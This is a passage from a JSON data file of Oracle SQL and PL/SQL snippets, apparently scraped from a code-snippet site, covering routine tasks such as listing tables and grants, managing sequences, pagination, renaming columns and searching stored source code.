    "description": "SELECT * FROM ALL_TABLES;\nSELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLES_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All Tables\n-- NOTE: for Oracle ONLY  select *  from all_tables;\nSELECT e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME, sum(e.bytes) / 1048576 AS Megs FROM dba_extents e WHERE   e.OWNER = 'MY_USER' AND   e.TABLESPACE_NAME = 'MY_TABLESPACE' GROUP BY e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME ORDER BY e.TABLESPACE_NAME, e.SEGMENT_NAME;\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2852,
    "keyword": null,
    "link": null,
    "title": " oracle list tablespaces",
    "description": "SELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLES_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All Tables\nSELECT DISTINCT TABLESPACE_NAME FROM DBA_EXTENTS ORDER BY TABLESPACE_NAME;  SELECT TABLESPACE_NAME,        sum(BYTES / 1024 / 1024) AS MB FROM DBA_DATA_FILES GROUP BY TABLESPACE_NAME;\nSELECT e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME, sum(e.bytes) / 1048576 AS Megs FROM dba_extents e WHERE   e.OWNER = 'MY_USER' AND   e.TABLESPACE_NAME = 'MY_TABLESPACE' GROUP BY e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME ORDER BY e.TABLESPACE_NAME, e.SEGMENT_NAME;\nCREATE TABLESPACE TBS_NOME_TABLESPACE DATAFILE 'NOME_DATAFILE.dbf' SIZE 40M ONLINE;\nCREATE TABLE TB_NOME_TABELA ( CODIGO NUMBER(38) )TABLESPACE TBS_NOME_TABLESPACE;\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2853,
    "keyword": null,
    "link": null,
    "title": " oracle list user grants",
    "description": "-- List privileges, including roles, for my_user SELECT GRANTEE, PRIVILEGE AS PRIVILEGE_ROLE,        NULL AS OWNER, NULL AS TABLE_NAME, NULL AS COLUMN_NAME,        ADMIN_OPTION AS PRIVILEGE,         NULL AS GRANTABLE FROM DBA_SYS_PRIVS WHERE GRANTEE = 'my_user' UNION ALL SELECT r.GRANTEE, r.GRANTED_ROLE AS PRIVILEGE_ROLE, p.OWNER, p.TABLE_NAME,  \tp.COLUMN_NAME, PRIVILEGE, p.GRANTABLE FROM DBA_ROLE_PRIVS r LEFT JOIN ROLE_TAB_PRIVS p ON p.ROLE = r.GRANTED_ROLE WHERE r.GRANTEE = 'my_user';\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2854,
    "keyword": null,
    "link": null,
    "title": " oracle list users",
    "description": "SELECT * FROM DBA_USERS WHERE USERNAME = 'MY_USER';\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2855,
    "keyword": null,
    "link": null,
    "title": " oracle list views",
    "description": "SELECT * FROM USER_VIEWS;\t\t-- Views from connected schema SELECT * FROM ALL_VIEWS;\t\t-- Views available to connected schema \tSELECT * FROM ALL_VIEWS WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_VIEWS WHERE VIEW_NAME = 'VIEW_NAME'; SELECT * FROM DBA_VIEWS;\t\t-- All database Views\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2856,
    "keyword": null,
    "link": null,
    "title": " oracle lister les trigger",
    "description": "SELECT * FROM ALL_TRIGGERS WHERE TABLE_NAME ='table_name'; SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE = 'TRIGGER'; -- Ref columns: SELECT * FROM ALL_TRIGGER_COLS WHERE TABLE_NAME ='table_name'; -- Or DBA_TRIGGERS / USER_TRIGGERS, DBA_TRIGGER_COLS, ...\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2857,
    "keyword": null,
    "link": null,
    "title": " oracle log files",
    "description": "SELECT l.THREAD#, lf.GROUP#, lf.MEMBER,        trunc(l.BYTES / 1e6) AS SIZE_MB,        l.STATUS, l.ARCHIVED, lf.TYPE,        lf.IS_RECOVERY_DEST_FILE AS RDF,        l.SEQUENCE#, l.FIRST_CHANGE#,        l.NEXT_CHANGE# FROM V$LOGFILE lf JOIN V$LOG l ON l.GROUP# = lf.GROUP# ORDER BY l.THREAD#, lf.GROUP#, lf.MEMBER;\nCREATE OR REPLACE PROCEDURE \"WRITELOG\" (LOGLEVEL IN VARCHAR2, LOGCONTEXT IN VARCHAR2, LOGMESSAGE IN VARCHAR2) AUTHID CURRENT_USER AS     F1 UTL_FILE.FILE_TYPE;     PRAGMA AUTONOMOUS_TRANSACTION;     LOG_DIR VARCHAR2;     LOG_FILENAME VARCHAR2; BEGIN     LOG_DIR := 'MYLOG_DIR';     LOG_FILENAME := 'mylog';     F1 := UTL_FILE.FOPEN(LOG_DIR, TO_CHAR(SYSDATE,'YYYY-MM-DD') || '_' ||  LOG_FILENAME ||'.log','a');     UTL_FILE.PUT_LINE(F1, TO_CHAR(SYSDATE,'DD-MM-YYYY HH:MI:SS AM') || ' - [' || LOGLEVEL || '] ' || LOGCONTEXT || ': ' || LOGMESSAGE);     UTL_FILE.FCLOSE(F1);  EXCEPTION     WHEN OTHERS THEN       DBMS_OUTPUT.PUT_LINE('ERROR: ' || TO_CHAR(SQLCODE) || SQLERRM);       IF UTL_FILE.IS_OPEN(F1) THEN         UTL_FILE.FCLOSE(F1);       END IF; END;  \n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2858,
    "keyword": null,
    "link": null,
    "title": " oracle lowercase",
    "description": "SELECT lower('AbBc') FROM DUAL;     -- abbc\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2859,
    "keyword": null,
    "link": null,
    "title": " oracle merge insert if not exists",
    "description": "MERGE INTO table1 t1 USING (SELECT 'value1' AS value1, value2        FROM table2        WHERE table2.type = 'ok') t2 ON (t1.value1 = t2.value1) WHEN NOT MATCHED THEN     INSERT VALUES (t2.value1, t2.value2);\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2860,
    "keyword": null,
    "link": null,
    "title": " oracle new column",
    "description": "-- ALTER TABLE <table> ADD <column> <type>  <constraint>; ALTER TABLE members ADD age NUMBER; ALTER TABLE members ADD birth_date DATE NOT NULL; ALTER TABLE members ADD registering DATE DEFAULT sysdate; ALTER TABLE members ADD member_id NUMBER UNIQUE;\n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2861,
    "keyword": null,
    "link": null,
    "title": " oracle nextval",
    "description": "SELECT schema.seq_name.NEXTVAL FROM dual;  INSERT INTO table_name (VALUE1) VALUES ( \tschema.seq_name.NEXTVAL AS VALUE1 );\n select sec_codigolibros.nextval from dual; \n",
    "reg_date": "2021-10-12T09:58:25.000Z"
  },
  {
    "id": 2862,
    "keyword": null,
    "link": null,
    "title": " oracle nextval insert",
    "description": "SELECT schema.seq_name.NEXTVAL FROM dual;  INSERT INTO table_name (VALUE1) VALUES ( \tschema.seq_name.NEXTVAL AS VALUE1 );\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2863,
    "keyword": null,
    "link": null,
    "title": " oracle nls date format",
    "description": "-- Date format for session ALTER SESSION SET NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2864,
    "keyword": null,
    "link": null,
    "title": " oracle nls instance",
    "description": "SELECT * FROM (SELECT 'SESSION' SCOPE, nsp.* FROM NLS_SESSION_PARAMETERS nsp       UNION ALL       SELECT 'DATABASE' SCOPE, ndp.* FROM NLS_DATABASE_PARAMETERS ndp       UNION ALL       SELECT 'INSTANCE' SCOPE, nip.* FROM NLS_INSTANCE_PARAMETERS nip) a PIVOT (listagg(VALUE) WITHIN GROUP (ORDER BY SCOPE) FOR SCOPE IN (     'SESSION' AS \"SESSION\" ,'DATABASE' AS DATABASE ,'INSTANCE' AS INSTANCE)); -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2865,
    "keyword": null,
    "link": null,
    "title": " oracle nls parameters",
    "description": "SELECT * FROM (SELECT 'SESSION' SCOPE, nsp.* FROM NLS_SESSION_PARAMETERS nsp       UNION ALL       SELECT 'DATABASE' SCOPE, ndp.* FROM NLS_DATABASE_PARAMETERS ndp       UNION ALL       SELECT 'INSTANCE' SCOPE, nip.* FROM NLS_INSTANCE_PARAMETERS nip) a PIVOT (listagg(VALUE) WITHIN GROUP (ORDER BY SCOPE) FOR SCOPE IN (     'SESSION' AS \"SESSION\" ,'DATABASE' AS DATABASE ,'INSTANCE' AS INSTANCE)); -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2866,
    "keyword": null,
    "link": null,
    "title": " oracle nls session",
    "description": "SELECT * FROM (SELECT 'SESSION' SCOPE, nsp.* FROM NLS_SESSION_PARAMETERS nsp       UNION ALL       SELECT 'DATABASE' SCOPE, ndp.* FROM NLS_DATABASE_PARAMETERS ndp       UNION ALL       SELECT 'INSTANCE' SCOPE, nip.* FROM NLS_INSTANCE_PARAMETERS nip) a PIVOT (listagg(VALUE) WITHIN GROUP (ORDER BY SCOPE) FOR SCOPE IN (     'SESSION' AS \"SESSION\" ,'DATABASE' AS DATABASE ,'INSTANCE' AS INSTANCE)); -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2867,
    "keyword": null,
    "link": null,
    "title": " oracle no data found error code",
    "description": "BEGIN  select... into...  EXCEPTION WHEN NO_DATA_FOUND THEN do_something END;\nNO_DATA_FOUND : ORA-01403\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2868,
    "keyword": null,
    "link": null,
    "title": " oracle number to percentage",
    "description": "-- Formatted SELECT decimal_column * 100 || '%' AS percentage FROM table_name; -- Rounded SELECT round(decimal_column * 100, 2) || '%' AS percentage FROM table_name; -- Value SELECT decimal_column * 100 AS percentage FROM table_name; SELECT TO_CHAR(decimal_column,'fm990D00','NLS_NUMERIC_CHARACTERS = ''.,''')  \tFROM dual;\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2869,
    "keyword": null,
    "link": null,
    "title": " oracle nvl2",
    "description": "NVL2( string_to_test, value_if_NOT_null, value_if_null )\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2870,
    "keyword": null,
    "link": null,
    "title": " oracle object dependencies ",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:58:26.000Z"
  },
  {
    "id": 2871,
    "keyword": null,
    "link": null,
    "title": " oracle output line",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2872,
    "keyword": null,
    "link": null,
    "title": " oracle output to console",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2873,
    "keyword": null,
    "link": null,
    "title": " oracle owner view",
    "description": "SELECT * FROM USER_VIEWS;\t\t-- Views from connected schema SELECT * FROM ALL_VIEWS;\t\t-- Views available to connected schema \tSELECT * FROM ALL_VIEWS WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_VIEWS WHERE VIEW_NAME = 'VIEW_NAME'; SELECT * FROM DBA_VIEWS;\t\t-- All database Views\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2874,
    "keyword": null,
    "link": null,
    "title": " oracle pagination query offset",
    "description": "SELECT * FROM (     SELECT a.*, rownum rn     FROM (         SELECT * FROM ORDERS WHERE CustomerID LIKE 'A%'         ORDER BY OrderDate DESC, ShippingDate DESC     ) a     WHERE rownum < ((pageNumber * pageSize) + 1 ) ) WHERE rn >= (((pageNumber-1) * pageSize) + 1);\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2875,
    "keyword": null,
    "link": null,
    "title": " oracle pagination query rownum",
    "description": "SELECT * FROM (     SELECT a.*, rownum rn     FROM (         SELECT * FROM ORDERS WHERE CustomerID LIKE 'A%'         ORDER BY OrderDate DESC, ShippingDate DESC     ) a     WHERE rownum < ((pageNumber * pageSize) + 1 ) ) WHERE rn >= (((pageNumber-1) * pageSize) + 1);\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2876,
    "keyword": null,
    "link": null,
    "title": " oracle percentage",
    "description": "-- Formatted SELECT decimal_column * 100 || '%' AS percentage FROM table_name; -- Rounded SELECT round(decimal_column * 100, 2) || '%' AS percentage FROM table_name; -- Value SELECT decimal_column * 100 AS percentage FROM table_name; SELECT TO_CHAR(decimal_column,'fm990D00','NLS_NUMERIC_CHARACTERS = ''.,''')  \tFROM dual;\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2877,
    "keyword": null,
    "link": null,
    "title": " oracle pipelined function",
    "description": "-- Return types CREATE TYPE t_tf_row AS OBJECT (   \tid           NUMBER,   \tdescription  VARCHAR2(50) ); CREATE TYPE t_tf_tab IS TABLE OF t_tf_row; -- Build a pipelined table function. CREATE OR REPLACE FUNCTION get_tab_ptf (p_rows IN NUMBER)  \tRETURN t_tf_tab PIPELINED AS BEGIN   \tFOR i IN 1 .. p_rows LOOP     \tPIPE ROW(t_tf_row(i, 'Description for ' || i));      \tEND LOOP;   \tRETURN; END; -- Test it. SELECT * FROM TABLE(get_tab_ptf(10)) ORDER BY id DESC;\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2878,
    "keyword": null,
    "link": null,
    "title": " oracle pipelined function return rowtype",
    "description": "-- Return types CREATE TYPE t_tf_row AS OBJECT (   \tid           NUMBER,   \tdescription  VARCHAR2(50) ); CREATE TYPE t_tf_tab IS TABLE OF t_tf_row; -- Build a pipelined table function. CREATE OR REPLACE FUNCTION get_tab_ptf (p_rows IN NUMBER)  \tRETURN t_tf_tab PIPELINED AS BEGIN   \tFOR i IN 1 .. p_rows LOOP     \tPIPE ROW(t_tf_row(i, 'Description for ' || i));      \tEND LOOP;   \tRETURN; END; -- Test it. SELECT * FROM TABLE(get_tab_ptf(10)) ORDER BY id DESC;\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2879,
    "keyword": null,
    "link": null,
    "title": " oracle pl sql source",
    "description": "select * from   all_source where  lower(text) like lower('%Some source%');\n",
    "reg_date": "2021-10-12T09:58:27.000Z"
  },
  {
    "id": 2880,
    "keyword": null,
    "link": null,
    "title": " oracle plsql sleep",
    "description": "DBMS_SESSION.SLEEP(5); DBMS_LOCK.SLEEP(5);\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2881,
    "keyword": null,
    "link": null,
    "title": " oracle query ignore case in where clause",
    "description": "SELECT * FROM my_table WHERE upper(MY_COLUMN) = upper('My_String');\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2882,
    "keyword": null,
    "link": null,
    "title": " oracle rank() over (partition)",
    "description": "-- Employees per department, ranked in salary order SELECT EMPNO,        DEPTNO,        SAL,        rank() OVER (PARTITION BY DEPTNO ORDER BY SAL) AS MYRANK FROM EMP;\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2883,
    "keyword": null,
    "link": null,
    "title": " oracle rank",
    "description": "-- Employees per department, ranked in salary order SELECT EMPNO,        DEPTNO,        SAL,        rank() OVER (PARTITION BY DEPTNO ORDER BY SAL) AS MYRANK FROM EMP;\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2884,
    "keyword": null,
    "link": null,
    "title": " oracle rebuild unusable indexes",
    "description": "-- Indexes: SELECT 'alter index ' || OWNER || '.' || INDEX_NAME || ' rebuild tablespace '  \t|| TABLESPACE_NAME || ';' SQL_TO_REBUILD_INDEX FROM DBA_INDEXES WHERE STATUS = 'UNUSABLE'; -- Index partitions: SELECT 'alter index ' || INDEX_OWNER || '.' || INDEX_NAME  \t|| ' rebuild partition ' || PARTITION_NAME || ' TABLESPACE '      || TABLESPACE_NAME || ';' SQL_TO_REBUILD_INDEX FROM DBA_IND_PARTITIONS WHERE STATUS = 'UNUSABLE'; -- Index subpartitions: SELECT 'alter index ' || INDEX_OWNER || '.' || INDEX_NAME  \t|| ' rebuild subpartition ' || SUBPARTITION_NAME || ' TABLESPACE '      || TABLESPACE_NAME || ';' SQL_TO_REBUILD_INDEX FROM DBA_IND_SUBPARTITIONS WHERE STATUS = 'UNUSABLE';\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2885,
    "keyword": null,
    "link": null,
    "title": " oracle remove line breaks",
    "description": "-- Removes line breaks DECLARE     teststring VARCHAR2(32767) := ' This is the value  that I chose'; BEGIN     DBMS_OUTPUT.PUT_LINE(teststring);     DBMS_OUTPUT.PUT_LINE(replace(replace(teststring, chr(13), ''), chr(10), ' ')); END;\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2886,
    "keyword": null,
    "link": null,
    "title": " oracle rename column",
    "description": "alter table sales rename column order_date to date_of_order;\nRENAME table_name TO new_name;\nALTER TABLE my_table RENAME COLUMN old_name TO new_name;  -- To check if column exists before renaming it: DECLARE     l_cnt INTEGER; BEGIN     SELECT count(*) INTO l_cnt     FROM dba_tab_columns\t\t-- or all_tab_columns (depending on grants)     WHERE owner = 'my_schema' AND table_name = 'my_table'      \tAND column_name = 'my_col';     IF (l_cnt = 1) THEN         EXECUTE IMMEDIATE 'ALTER TABLE my_table          \tRENAME COLUMN my_col TO my_new_name';     END IF; END;\nALTER TABLE table_name   RENAME COLUMN old_name TO new_name;\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2887,
    "keyword": null,
    "link": null,
    "title": " oracle rename column if exists",
    "description": "ALTER TABLE my_table RENAME COLUMN old_name TO new_name;  -- To check if column exists before renaming it: DECLARE     l_cnt INTEGER; BEGIN     SELECT count(*) INTO l_cnt     FROM dba_tab_columns\t\t-- or all_tab_columns (depending on grants)     WHERE owner = 'my_schema' AND table_name = 'my_table'      \tAND column_name = 'my_col';     IF (l_cnt = 1) THEN         EXECUTE IMMEDIATE 'ALTER TABLE my_table          \tRENAME COLUMN my_col TO my_new_name';     END IF; END;\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2888,
    "keyword": null,
    "link": null,
    "title": " oracle rename table",
    "description": "alter table sales rename column order_date to date_of_order;\nRENAME table_name TO new_name;\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2889,
    "keyword": null,
    "link": null,
    "title": " oracle replace",
    "description": "SELECT REPLACE('JACK and JUE','J','BL') \"Changes\"      FROM DUAL;  Changes -------------- BLACK and BLUE\n",
    "reg_date": "2021-10-12T09:58:28.000Z"
  },
  {
    "id": 2890,
    "keyword": null,
    "link": null,
    "title": " oracle reset password",
    "description": "-- Unlock a user ALTER USER my_user ACCOUNT UNLOCK; -- If password is expired  ALTER USER my_user IDENTIFIED BY new_password ACCOUNT UNLOCK;\n-- Changes password for the schema.  -- Add double quotes to new_password in case of special characters ALTER USER my_user IDENTIFIED BY new_password; -- Unlock a user ALTER USER my_user ACCOUNT UNLOCK; -- Unlock and change password ALTER USER my_user IDENTIFIED BY new_password ACCOUNT UNLOCK; -- Force user to change password at first login ALTER USER my_user IDENTIFIED BY PASSWORD EXPIRE;\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2891,
    "keyword": null,
    "link": null,
    "title": " oracle reset sequence",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';  ALTER SEQUENCE seq_name INCREMENT BY 100;\t-- Value to reach desired value - 1 SELECT seq_name.nextval FROM dual;\t\t\t-- Reinitialize value to desired ALTER SEQUENCE seq_name INCREMENT BY 1;\t\t-- Back to init step\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2892,
    "keyword": null,
    "link": null,
    "title": " oracle right characters",
    "description": "-- For Oracle only  -- syntax  SUBSTR(<main-string>,-<number-of-characters>)  -- example  SUBSTR('Useless stuff',-9) -- OUTPUT: ess stuff  -- practical example SELECT SUBSTR('Useless stuff',-9) FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2893,
    "keyword": null,
    "link": null,
    "title": " oracle role user",
    "description": "GRANT role_name TO user_name; ALTER USER user_name DEFAULT ROLE role_name; -- Check: SELECT * FROM DBA_ROLES WHERE ROLE = 'role_name'; SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'role_name'  \tAND GRANTEE = 'user_name';\n-- CREATE ROLE role_name [IDENTIFIED BY password] [NOT IDENTIFIED] CREATE ROLE role_name; GRANT CREATE SESSION, ALTER SESSION TO role_name; GRANT SELECT, INSERT, DELETE, UPDATE ON table_name TO role_name; GRANT EXECUTE ON proc_name TO role_name; -- Grant role to user GRANT role_name TO user_name; ALTER USER user_name DEFAULT ROLE role_name; SELECT * FROM DBA_ROLES WHERE ROLE = 'role_name'; SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'role_name'  \tAND GRANTEE = 'user_name';\nGRANT role_name TO user_name;\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2894,
    "keyword": null,
    "link": null,
    "title": " oracle rollback",
    "description": "-- Rollback (cancellation) DELETE FROM employees WHERE employee_id = 123;    -- Done in current session ROLLBACK;                                         -- Cancelled in current session SELECT * FROM employees WHERE employee_id = 123;  -- Found -- Commit (validation) DELETE FROM employees WHERE employee_id = 123;    -- Done in current session COMMIT;                                           -- Visible for ALL sessions SELECT * FROM employees WHERE employee_id = 123;  -- Missing for ALL sessions\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2895,
    "keyword": null,
    "link": null,
    "title": " oracle running queries",
    "description": "SELECT s.SID,        s.USERNAME,        sql.OPTIMIZER_MODE,        sql.CPU_TIME,        sql.ELAPSED_TIME,        sql.SQL_TEXT,        s.SERIAL# FROM V$SQLAREA sql,      V$SESSION s WHERE s.SQL_HASH_VALUE = sql.HASH_VALUE   AND s.SQL_ADDRESS = sql.ADDRESS   AND s.USERNAME IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2896,
    "keyword": null,
    "link": null,
    "title": " oracle running queries sql",
    "description": "SELECT s.SID,        s.USERNAME,        sql.OPTIMIZER_MODE,        sql.CPU_TIME,        sql.ELAPSED_TIME,        sql.SQL_TEXT,        s.SERIAL# FROM V$SQLAREA sql,      V$SESSION s WHERE s.SQL_HASH_VALUE = sql.HASH_VALUE   AND s.SQL_ADDRESS = sql.ADDRESS   AND s.USERNAME IS NOT NULL;\nSELECT s.SID,        s.USERNAME,        OPTIMIZER_MODE,        HASH_VALUE,        ADDRESS,        CPU_TIME,        ELAPSED_TIME,        SQL_TEXT,        SERIAL# FROM V$SQLAREA SQLAREA,      V$SESSION s WHERE s.SQL_HASH_VALUE = SQLAREA.HASH_VALUE   AND s.SQL_ADDRESS = SQLAREA.ADDRESS   AND s.USERNAME IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2897,
    "keyword": null,
    "link": null,
    "title": " oracle saurce code",
    "description": "select * from   all_source where  lower(text) like lower('%Some source%');\nSELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2898,
    "keyword": null,
    "link": null,
    "title": " oracle scan source ddl",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:29.000Z"
  },
  {
    "id": 2899,
    "keyword": null,
    "link": null,
    "title": " oracle scheduler program list",
    "description": "-- Depending on connected user grants: SELECT * FROM ALL_SCHEDULER_PROGRAMS ORDER BY OWNER, PROGRAM_NAME; SELECT * FROM DBA_SCHEDULER_PROGRAMS WHERE OWNER = 'schema_name'; SELECT * FROM USER_SCHEDULER_PROGRAMS;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2900,
    "keyword": null,
    "link": null,
    "title": " oracle schema size",
    "description": "SELECT sum(BYTES) / 1e6 AS SIZE_MB FROM DBA_SEGMENTS WHERE OWNER = 'schema_name'; -- By type SELECT SEGMENT_TYPE, sum(BYTES) / 1e6 AS SIZE_MB FROM DBA_SEGMENTS     WHERE OWNER = 'schema_name' GROUP BY SEGMENT_TYPE; -- By schema SELECT OWNER, sum(BYTES) / 1e6 AS SIZE_MB FROM DBA_SEGMENTS GROUP BY OWNER     ORDER BY SIZE_MB DESC;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2901,
    "keyword": null,
    "link": null,
    "title": " oracle search code in packages",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' \tAND TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2902,
    "keyword": null,
    "link": null,
    "title": " oracle search columns in schema",
    "description": "select t.owner as schema_name,        t.table_name , col.column_name from sys.all_tab_columns col inner join sys.all_tables t on col.owner = t.owner                                and col.table_name = t.table_name where col.column_name = '' and col.owner not in ('') order by col.owner,           col.table_name;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2903,
    "keyword": null,
    "link": null,
    "title": " oracle search in date columns",
    "description": "select * from table where es_date=TO_DATE('27-APR-12','dd-MON-yy')\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2904,
    "keyword": null,
    "link": null,
    "title": " oracle search source code",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' \tAND TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2905,
    "keyword": null,
    "link": null,
    "title": " oracle search stored procedures for text",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' \tAND TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2906,
    "keyword": null,
    "link": null,
    "title": " oracle search text in all packages",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' \tAND TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2907,
    "keyword": null,
    "link": null,
    "title": " oracle search view code",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' \tAND TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') ORDER BY owner, name, type, line;\n-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'FLEX_TRADE_AGREG', 'OWNER_NAME')  \tFROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:30.000Z"
  },
  {
    "id": 2908,
    "keyword": null,
    "link": null,
    "title": " oracle select first 10 rows",
